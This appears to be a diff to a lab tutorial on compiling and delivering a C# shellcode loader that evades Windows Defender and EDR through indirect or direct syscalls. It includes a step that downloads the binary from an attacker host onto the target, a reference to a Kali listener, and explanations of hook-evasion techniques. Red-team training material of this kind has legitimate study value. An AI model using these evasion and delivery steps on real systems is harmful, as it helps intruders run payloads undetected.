@@ -538,13 +538,19 @@ Save the printed XOR key.
 
 ### Step 2: Compile Loader 03
 
-On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:
+On the dev box (ammulu, 192.168.10.150), open Command Prompt and create a new project:
 
 ```
-csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
+dotnet new console -n Loader03
 ```
 
-The `/unsafe` flag is needed because Marshal.Copy and Marshal.GetDelegateForFunctionPointer work with unmanaged memory pointers. Expected output: the compiler produces syscall_loader.exe with no errors.
+Replace the contents of `Loader03\Program.cs` with the code from `03_direct_syscalls_loader.cs` (with the shellcode bytes already in place). Then publish as a single .exe:
+
+```
+dotnet publish Loader03 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output/
+```
+
+Expected output: the command produces `output\Loader03.exe` with no errors.
 
 ### Step 3: Transfer the Files to the Target
 
@@ -555,12 +561,13 @@ cd C:\Users\ammulu\Desktop
 python -m http.server 8080
 ```
 
-On the target (kimjongun, 192.168.10.100), download both:
+On the target (kimjongun, 192.168.10.100), download the compiled binary:
 
 ```powershell
-Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
-Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/Loader03.exe" -OutFile "C:\Users\kimjongun\Desktop\Loader03.exe"
 ```
+
+The shellcode is already embedded in the binary. No separate .bin file is needed on the target.
 
 ### Step 4: Set Up Your Listener on Kali
 
@@ -654,13 +661,13 @@ Documents 08, 09, and 10 address these remaining layers for maximum stealth.
 
 ## Common Threats and Variations
 
-### Variation 1: Indirect Syscalls
+### Variation 1: Direct Syscalls (Inline Assembly)
 
-Loader 03 calls NT functions through ntdll.dll using GetProcAddress. An advanced variation is indirect syscalls, where you find the `syscall` instruction inside ntdll.dll and jump to it from your own code. The benefit is that the call stack shows the return address inside ntdll.dll, which looks legitimate to any EDR that walks the call stack.
+Loader 03 uses indirect syscalls - it finds the `syscall; ret` gadget inside ntdll and jumps to it. The jump target is a memory address inside ntdll, so the call stack shows a return address inside ntdll, which looks legitimate to any EDR that walks the call stack.
 
-The difference: regular dynamic resolution calls the function from the beginning, going through any hooks. Indirect syscalls skip to the `syscall` instruction itself, avoiding the hook entirely. This is more evasive but also more complex to implement.
+A different approach is direct syscalls, where you embed the raw `syscall` instruction directly in your own code stub rather than jumping to ntdll's copy. The benefit is that the call never touches ntdll at all - not even the gadget. The downside is that you have to embed raw x86 opcodes (typically 0x0F 0x05 for `syscall`) as a byte array in your code and cast it to a function pointer. You also need to look up the syscall number (SSN) yourself from ntdll's memory at runtime, because direct syscalls still require the correct SSN for the current Windows version.
 
-Loader 03 does not use true indirect syscalls, but the SysWhispers3 and SysWhispers4 tools referenced in the loader's header can generate C# code that does. For most Defender-only scenarios (no third-party EDR), the dynamic resolution approach in Loader 03 is sufficient.
+Tools like SysWhispers3 and SysWhispers4 can generate either style automatically. For most Defender-only scenarios without a third-party EDR, the indirect syscall approach in Loader 03 is sufficient and simpler to implement in C#.
 
 ### Variation 2: Manual Syscall Number Resolution
 
